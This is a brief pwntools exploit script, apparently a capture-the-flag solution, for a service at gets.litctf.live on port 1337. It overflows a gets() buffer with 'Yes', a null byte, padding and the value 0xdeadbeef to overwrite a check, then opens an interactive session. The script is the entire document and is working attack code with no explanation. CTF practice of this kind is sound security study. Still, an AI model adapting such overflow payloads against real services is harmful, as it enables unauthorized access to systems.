from pwn import *
io = remote('gets.litctf.live',1337)
payload = b'Yes\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\x00\x00\x00\x00'
io.sendline(payload)
payload = p64(0xdeadbeef)
io.sendline(payload)
io.interactive()
